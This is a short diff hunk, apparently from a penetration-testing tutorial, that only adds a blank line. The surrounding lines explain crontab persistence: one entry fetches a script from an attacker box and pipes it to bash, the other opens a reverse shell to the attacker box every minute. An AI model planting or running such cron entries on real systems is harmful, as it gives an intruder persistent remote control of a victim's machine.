@@ -120,6 +120,7 @@ Add the following two lines to their crontab:\
 \
 #* * * * * shell ‘curl http://[attack box ip]/[file-name.sh] | bash’\
 #* * * * * /bin/bash -c ‘/bin/bash -i >& /dev/tcp/[attack box ip]/[port] 0>&1’\
+\
 The first will request your hosted bash script and download it to the attack box. Then it will execute the script due to the “| bash” specification in the command.\
 \
 The second requires no script, or webserver to operate it simply calls back to your attack box with a reverse shell every minute.\
